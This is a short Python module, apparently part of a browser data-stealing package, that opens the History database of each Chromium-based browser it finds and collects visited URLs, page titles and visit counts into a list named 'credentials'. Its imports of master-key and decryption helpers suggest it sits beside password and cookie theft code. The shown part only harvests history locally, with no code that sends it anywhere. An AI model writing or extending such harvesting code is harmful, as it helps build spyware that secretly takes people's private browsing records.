
# Import modules
from . import GetMasterKey, FetchDataBase, DecryptValue, ConvertDate, GetBrowsers

""" Fetch history from chromium based browsers """
def Get():
    global credentials
    credentials = []
    for browser in GetBrowsers():
        database = FetchDataBase(browser + "\\History", "SELECT * FROM urls")
        for row in database:
            history = {
                "hostname": row[1],
                "title": row[2],
                "visits": row[3] + 1,
                "expires": ConvertDate(row[5])
            }
            credentials.append(history)

    return credentials
